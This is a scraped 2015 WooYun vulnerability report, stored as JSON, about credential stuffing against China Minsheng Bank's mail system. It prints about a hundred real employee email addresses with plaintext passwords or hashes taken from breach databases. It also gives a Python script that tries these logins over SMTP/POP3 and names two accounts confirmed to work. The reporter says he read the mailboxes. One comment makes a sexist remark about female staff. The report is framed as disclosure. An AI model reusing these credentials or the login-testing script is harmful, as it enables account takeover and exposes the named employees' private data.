{"id": 38185, "wybug_id": "wooyun-2015-0106427", "wybug_title": "民生银行某内部系统缺陷可撞裤泄漏内部信息", "wybug_corp": "中国民生银行", "wybug_author": "qq_hhl", "wybug_date": "2015-04-07 19:34", "wybug_open_date": "2015-05-23 09:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向公众公开  简要描述： http://www.wooyun.org/bugs/wooyun-2015-0106343 看这个帖子吧。我看到你们说会尽快把那两个账户回去修一下就知道怎么回事了，就想笑。刚才招行的MM上门办信用卡，拖延了一下这篇文章的发表抱歉。我再给你们列一些账户，你们得好好回去修一下。民生银行对白帽子的态度是友好的，对白帽子的反馈的响应速度是很快的，但是知其然不知其所以然，修两个账户怎么能够呢，我列出来的邮箱的你们的这些员工应该拖回去被妈妈打屁股，银行这么敏感的行业，员工的网络安全意识参差不齐。该警醒了。 详细说明：  从如下公开数据库中搜索关键字cmbc.com.cn得到文件1.txtCSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条。得到的1.txt不完全结果为\n正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_100SDA.txt行号 771858 - 殺人基本靠脸 cmbc87218 sunyu6<@cmbc.com.cn>行号 925298 - 殺人基本靠脸 cmbc87218 sunyu6<@cmbc.com.cn>行号 1017873 - 雨轻轻弹 haoyu521 wanghaoyu<@cmbc.com.cn>行号 1041351 - 冰汶 198924 jiangxiaoping<@cmbc.com.cn>找到 4  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_96万.txt行号 487571 - 眉眼弯弯处 zhongai zhanglihui<@cmbc.com.cn>行号 641420 - songfei1<@cmbc.com.cn> ---- sf301908行号 647469 - dingjing<@cmbc.com.cn> ---- djy20090210行号 678370 - huanghai<@cmbc.com.cn> ---- hh311516行号 739584 - ZHANGXI2<@CMBC.COM.CN> ---- Mynameis9527行号 778283 - yangyu5<@cmbc.com.cn> ---- 21214找到 6  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_FDQ-1002.TXt行号 16085 - wanghai<@cmbc.com.cn> 199638行号 523582 - guanwenfeng<@cmbc.com.cn> 111111行号 570176 - jiangqiangxin<@cmbc.com.cn> 3368119770909行号 776950 - wenwenjing<@cmbc.com.cn> 1qaz1234行号 1023293 - linshi<@cmbc.com.cn> 123123找到 5  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_FDQ-1003.TXt行号 853234 - liyiyang<@cmbc.com.cn> 19840807找到 1  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_FDQ-1004.TXt行号 155029 - zhouyiying<@cmbc.com.cn> 5117519842214行号 262344 - mengqingzhe<@cmbc.com.cn> test11行号 380688 - 285725221<@cmbc.com.cn> 860303行号 513868 - liuzhe3<@cmbc.com.cn> 840509行号 559278 - liuzhiqiang<@cmbc.com.cn> 811021行号 634080 - SHENYU<@cmbc.com.cn> 13137368311行号 738646 - chenjifeng<@cmbc.com.cn> 19830129cjf行号 840514 - clgirl100<@cmbc.com.cn> 840709行号 951280 - shanaikun<@cmbc.com.cn> 111111行号 1037770 - xiongcao<@cmbc.com.cn> diablo找到 10  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_FDQ-1005.TXt行号 377264 - bjds2<@cmbc.com.cn> cmbccmbc行号 949003 - tianbing<@cmbc.com.cn> harrison找到 2  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\10_766_16368_\\10_766_16368_mumayi.com数据库.sql.txt行号 33466 - INSERT INTO mumayicdb_members VALUES('1509941', 'kyzy001645', 'edee935764a6e8645026000a306caa5c', '', '0', '0', '10', '0', '', '123.173.135.234', '1297477136', '', '1297477136', '1297477136', '1297477446', '1', '0', '0', '0', '0', '2', '0', '1', '0', '0', '0', '0', '0', '0', 'wangqian6<@cmbc.com.cn>', '0000-00-00', '0', '0', '0', '0', '0', '0', '1', '0', '1', '0', '9999', '1', '0', '2', '26', '0', '0', '0');找到 1  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\11_7k7k2000万_2047_\\11_7k7k2000万_2047_1-5.txt行号 326371 - guzhenxin<@cmbc.com.cn> z1978x行号 651528 - lixuyan<@cmbc.com.cn> lixuyan行号 2037327 - chengjun<@cmbc.com.cn> 5201314行号 4683887 - xiongcao<@cmbc.com.cn> diablo行号 4936776 - wangning2<@cmbc.com.cn> 902418行号 5061025 - chenxiang<@cmbc.com.cn> 790726找到 6  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\11_7k7k2000万_2047_\\11_7k7k2000万_2047_11-15.txt行号 20629 - lvxiaoyong<@cmbc.com.cn> 197565行号 115854 - shilei2<@cmbc.com.cn> slslsl行号 210872 - zhangjia1<@cmbc.com.cn> 1387158179行号 301047 - shiming<@cmbc.com.cn> symon0113行号 315656 - chenxiuping<@cmbc.com.cn> 721219行号 373906 - zhanglei17<@cmbc.com.cn> 498585zhanglei行号 411897 - duxiaoxiao<@cmbc.com.cn> 520826行号 422321 - lining2<@cmbc.com.cn> 1q2w3e0p行号 472668 - xiechunzhang<@cmbc.com.cn> 3694769698行号 634823 - jianglinlin<@cmbc.com.cn> 7732842603行号 705964 - renfang<@cmbc.com.cn> 12345679行号 719744 - jiangyangyang<@cmbc.com.cn> 599711行号 730260 - huxiangyu<@cmbc.com.cn> k3ZeChmExt行号 847559 - zhangjun1<@cmbc.com.cn> 654321行号 947396 - longxinxin<@cmbc.com.cn> zhenxi8719行号 1025285 - honglie<@cmbc.com.cn> EsnWtxRa65行号 3096253 - duantao<@cmbc.com.cn> 202165行号 3275475 - zhangqian5<@cmbc.com.cn> 19590601行号 3319244 - wangtao10<@cmbc.com.cn> 1.98185E+11行号 3403825 - xiaojianyu<@cmbc.com.cn> zxcasdqwe123行号 3561351 - caidan<@cmbc.com.cn> MAuDA32ea8行号 3641052 - mazhiwei<@cmbc.com.cn> 740120行号 3802929 - shanningbo<@cmbc.com.cn> 121512行号 3835001 - miaoli<@cmbc.com.cn> 829300行号 3932810 - donglianqi<@cmbc.com.cn> 0o290o29行号 3976951 - daijiajie<@cmbc.com.cn> 2.23805E+11找到 26  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\11_7k7k2000万_2047_\\11_7k7k2000万_2047_16-20.txt行号 154719 - liuduantian<@cmbc.com.cn> tian81119行号 191005 - bjds2<@cmbc.com.cn> cmbc8113行号 199864 - chenjunying<@cmbc.com.cn> 13328699119行号 268343 - huangchen<@cmbc.com.cn> 781121行号 283002 - sunyunjin<@cmbc.com.cn> 779737行号 331775 - liangchao1<@cmbc.com.cn> 551010行号 338361 - zouyi<@cmbc.com.cn> 13751773011行号 451288 - kongdewei<@cmbc.com.cn> 5.33422E+12行号 478087 - fengguanlei<@cmbc.com.cn> 123456行号 543008 - dongzhaohui<@cmbc.com.cn> dzhmsyh行号 566663 - linjuan<@cmbc.com.cn> 520888行号 689525 - liuyong<@cmbc.com.cn> vv6220099行号 832030 - zhangyeru<@cmbc.com.cn> zyrmaggie991206行号 853456 - zhangzhan<@cmbc.com.cn> z226063行号 3253185 - liuhai1<@cmbc.com.cn> 83642021行号 3283670 - zhangjijun<@cmbc.com.cn> qiao88l0320行号 3699880 - cuitong<@cmbc.com.cn> 681013行号 3728975 - linqin<@cmbc.com.cn> hikkb8cl找到 18  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\11_7k7k2000万_2047_\\11_7k7k2000万_2047_6-10.txt行号 281898 - qinlong<@cmbc.com.cn> 111111行号 408562 - yedingxin<@cmbc.com.cn> hanlili1行号 528868 - qulihua<@cmbc.com.cn>.com 7724118行号 2645284 - zhangjie5<@cmbc.com.cn> zhangjie112233行号 2814337 - mawenyuan<@cmbc.com.cn> bbsc33625行号 5304596 - sunyu6<@cmbc.com.cn> cmbc87218行号 5397171 - wanghaoyu<@cmbc.com.cn> haoyu521行号 5420649 - jiangxiaoping<@cmbc.com.cn> 198924行号 5518368 - yangxiaobo<@cmbc.com.cn> yxb524找到 9  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_1000-1050W.txt行号 121761 - nkt621        e476ad54a81d1c59a51ba9f84827b48b          wangying13<@cmbc.com.cn>行号 169454 - oklixiok      ea6e904fb74499afb13279e4e534675f          lixi2<@cmbc.com.cn>行号 321856 - wangpu6688    1b2f44cfb2f0d33535f713297ff30465          wangpu<@cmbc.com.cn>行号 472707 - 流氓终结者         c295594b8680ea624f49e9956b8721ce          lucheng<@cmbc.com.cn>找到 4  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_1050-1100W.txt行号 1903 - 姜竹席           ad813157af7cf71fa8738002ae2d1706          Jiangtianming<@cmbc.com.cn>行号 241830 - kyzy001645    c34bc0126cca45a3eff8e1bd45ef2794          wangqian6<@cmbc.com.cn>找到 2  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_150-200W.txt行号 178216 - 我爱李           994d049cbd8384dbcd13b8af433dd64f          likai5<@cmbc.com.cn>行号 307685 - 罗伟            9ec3811e5ca57e20b51a33b3f0b78f06          luowei<@cmbc.com.cn>行号 421605 - Smallfat      60eb4ed59a92d05d1f74424db8a6bdee          yedingxin<@cmbc.com.cn>找到 3  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_200-300W.txt行号 471035 - 半拉科学家         0bd6f9e16d3b20c0ade11be57d3bbdd3          qinlong<@cmbc.com.cn>找到 1  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_300-400W.txt行号 69460 - 樱一小无缺         663984488f2490e801b3faed9ad0d950          huzhiqiang<@cmbc.com.cn>行号 543097 - guowf3167     32250170a0dca92d53ec9624f336ca24          guoweifeng<@cmbc.com.cn>行号 599247 - 殺人基本靠脸        73a618c43006c783b4132e28780fbf20          sunyu6<@cmbc.com.cn>找到 3  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_451-500W.txt行号 140551 - 雨轻轻弹          0528d261969da07a168c4ade83c646d4          wanghaoyu<@cmbc.com.cn>行号 215916 - 冰汶            2ed8226869fef535781ac8dd9cf44978          jiangxiaoping<@cmbc.com.cn>找到 2  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_4月14日-4月25日.txt行号 88338 - maomao_ii     c2df71a88b0e61dc3cffa0a7ca294150          shilin1<@cmbc.com.cn>找到 1  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_500-550W.txt行号 8165 - 月之昼           174e8ddff3b7a8dbd2374cbe8258ca19          yangxiaobo<@cmbc.com.cn>行号 259488 - 高手的奶嘴         faf2ca38c02c5f2ba1c49d200a03f9fb          xiongcao<@cmbc.com.cn>找到 2  处。正在处理文件: D:\\BaiduYunDownload\\shegongku\\she拖库数据库_社工库\\供notepad++搜索\\12_aipai_1156_\\12_aipai_1156_551-600W.txt行号 78814 - 聖懿            c4ccb76933ae89ffacc2db959a26787f          huangkaiyong<@cmbc.com.cn>找到 1  处。搜索了 31 个文件，找到 107 处在 20 个文件中执行被用户中断！\n然后使用如下Python代码导入1.txt对民生银行邮件系统进行测试。\n# coding=gb2312import poplibimport smtplibimport sysdef checksmtppassword(smtp_server,username,password):\ttry:\t\tserver = smtplib.SMTP(smtp_server, 25)\t\t#server.set_debuglevel(2)\t\t\tserver.login(username, password)\texcept:\t\tprint '登录不成功'\telse:\t\tprint '登录成功'def checkpop3password(pop3_server,username,password):\ttry:\t\tserver = poplib.POP3(pop3_server)\t\t#server.set_debuglevel(2)\t\tserver.user(username)\t\tserver.pass_(password)\texcept Exception,e:\t\tprint '登录不成功'\telse:\t\tprint '登录成功'\tserver.quit()\t\tdef open_check_password_user(file_path,server_ip,user_num,pass_num,mode):\tmail_server=server_ip\tf=open(file_path)\teach_line=f.readline()\twhile each_line:\t\teach_line=each_line.strip('\\n')\t\tlist = each_line.split()  \t\t#print list[0]\t\tpassword=list[ int(pass_num) ]\t\tusername=list[ int(user_num) ]\t\tprint list[ int(user_num) ]\t\tprint list[ int(pass_num) ]\t\tif mode=='pop3' :\t\t\tcheckpop3password(mail_server,username,password)\t\tif mode=='smtp' :\t\t\tchecksmtppassword(mail_server,username,password)\t\t\t\t\t\teach_line=f.readline()\t\t\tif __name__ == '__main__':\t\tprint 'mail_check.py nefu.txt pop.nefu.edu.cn user_num pass_num mode'\t\tprint 'mail_check.py nefu.txt pop.nefu.edu.cn  2 1 pop3/smtp'\t\t\topen_check_password_user(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])\n经过几分钟测试之后就拿到两个账户。wangzhen@cmbc.com.cn katina8350    liuyong@cmbc.com.cn\tvv6220099...............剩下的你们自己测吧，耗费时间的活。   漏洞证明：  我们使用上面的两个帐号密码进行登录。邮箱都进去了，敏感信息都是一堆一堆的。银行太敏感了，我就不做内网渗透了。敏感信息只截图具有你们行特色的联系员工全国通讯录。虽然方便了员工，但是.....安全和用户体验你们还是要balance一下的。\n\n   修复方案：  知其然还要知其所以然，免费帮你们检测一下。不发工资，多给点rank也成。强制你们的相关员工(特别多)改一下密码，并加强下安全意识吧..   版权声明：转载请注明来源 qq_hhl@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-08 09:00 厂商回复： 非常感谢兄弟的提交，thanks！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-07 20:02 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  这些员工应该拖回去被妈妈打屁股，银行这么敏感的行业，员工的网络安全意识参差不齐。该警醒了。    \n     2015-04-07 22:52 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  @毛猴 女员工留给我好吗。。    \n     2015-04-08 08:42 |    \t\t中国民生银行(乌云厂商)\t\t \n  感谢兄弟的提交，我们会尽快处理，THANKS！    \n     2015-05-05 10:45 |    \t\tqq_hhl \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        | 传统二进制安全卫道士。新兴web安全追随...)\t\t \n  忘了说一句，我是来这个网站搜的www.tingmima.com    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}